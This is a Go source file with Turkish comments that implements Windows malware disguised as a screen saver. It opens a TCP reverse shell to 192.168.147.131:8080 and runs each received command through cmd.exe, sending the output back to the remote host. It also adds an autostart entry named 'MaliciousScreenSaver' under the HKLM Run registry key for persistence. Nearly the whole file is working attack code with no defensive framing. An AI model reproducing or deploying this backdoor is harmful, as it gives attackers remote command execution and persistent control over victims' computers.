package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"golang.org/x/sys/windows/registry"
)

func shell(conn net.Conn) {
	// Ters kabuk işlevini burada gerçekleştirin
	fmt.Println("Ters kabuk bağlantısı yapılıyor...")

	// Örnek olarak, bağlantı üzerinden bir "Hello, world!" mesajı gönderiyoruz.
	conn.Write([]byte("Hello, world!\n"))

	// Sonsuz döngü ile bağlantıyı sürekli olarak dinle
	scanner := bufio.NewScanner(conn)
	for {
		fmt.Print(">")
		scanner.Scan()
		text := scanner.Text()

		// Bağlantı kapalıysa döngüyü sonlandır
		if text == "" {
			fmt.Println("Bağlantı kapandı.")
			break
		}

		// Gelen komutu işleyin (örneğin, ekrana yazdırın)
		fmt.Println("Alınan komut:", text)

		// Gelen komutu çalıştırın
		cmd := exec.Command("cmd", "/C", text)
		output, err := cmd.CombinedOutput()

		// Çalıştırılan komutun çıktısını bağlantı üzerinden gönderin
		conn.Write(output)

		// Hata durumunda bağlantıyı kapayın
		if err != nil {
			fmt.Println("Hata:", err)
			break
		}
	}
}

func screenSaver() {
	// Bağlantı yapılacak IP adresi ve port
	ip := "192.168.147.131"
	port := "8080"

	// TCP bağlantısı başlat
	conn, err := net.Dial("tcp", ip+":"+port)
	if err != nil {
		fmt.Println("Bağlantı hatası:", err)
		return
	}
	defer conn.Close()

	// Ters kabuğu başlat
	go shell(conn)

	// Ekran koruyucuyu başlat
	key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)
	if err != nil {
		fmt.Println("Kayıt defteri hatası:", err)
		return
	}
	defer key.Close()

	// Programı otomatik başlatma anahtarı ekle
	err = key.SetStringValue("MaliciousScreenSaver", "C:\\Users\\User\\Desktop\\Persistence.exe")
	if err != nil {
		fmt.Println("Kayıt defteri hatası:", err)
		return
	}

	// Programın başlangıçta çalıştırılacağını belirt
	key.SetDWordValue("Run", 1)

	// Ekran koruyucu işlevinden sonra işlemleri devam ettir
	fmt.Println("Ekran koruyucu başlatıldı ve başlangıç programı eklendi.")
	select {}
}

func main() {
	// Ekran koruyucuyu başlat
	screenSaver()
}
